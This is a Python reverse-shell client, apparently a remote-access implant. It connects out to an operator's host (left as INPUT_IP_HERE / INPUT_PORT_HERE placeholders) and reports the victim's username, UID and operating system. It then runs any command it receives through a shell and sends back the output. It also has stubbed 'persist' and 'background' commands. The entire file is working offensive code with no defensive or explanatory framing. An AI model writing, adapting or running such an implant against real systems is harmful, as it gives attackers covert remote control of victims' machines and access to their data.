import socket
import subprocess
import os
import sys
import pwd
import platform
import time

def inbound():
    print("[+] Awaiting response...")
    message = " "

    while True:
        try:
            message = sock.recv(1024).decode()
            return message

        except Exception:
            sock.close()

def outbound(message):
    response = str(message).encode()
    sock.send(response)

def session_handler():
    try:
        print(f"[+] Connecting to {host_ip}.")
        sock.connect((host_ip, host_port))
        outbound(pwd.getpwuid(os.getuid())[0])
        outbound(os.getuid())
        time.sleep(1)
        op_sys = platform.uname()
        op_sys = (f'{op_sys[0]} {op_sys[2]}')
        outbound(op_sys)
        print(f"[+] Connected to {host_ip}.")

    except ConnectionRefusedError:
        pass

    while True:
        message = inbound()
        print(f"[+] Message received - {message}")

        if message == "exit":
            print("[-] The server has terminated the session.")
            sock.close()
            break

        elif message.split(" ")[0] == "cd":
            try:
                directory = str(message.split(" ")[1])
                os.chdir(directory)
                cur_dir = os.getcwd()
                print(f"[+] Changed to {cur_dir}")
                outbound(cur_dir)

            except FileNotFoundError:
                outbound("[-] File or directory does not exist.")
                continue
                
        elif message == "help":
            pass

        elif message == "background":
            pass

        elif message == "persist":
            pass
        
        else:
            command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = command.stdout.read() + command.stderr.read()
            outbound(output.decode())

if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        host_ip = "INPUT_IP_HERE"
        host_port = INPUT_PORT_HERE
        session_handler()

    except IndexError:
        print("[!] Command line argument(s) missing.")
    
    except Exception as e:
        print(e)
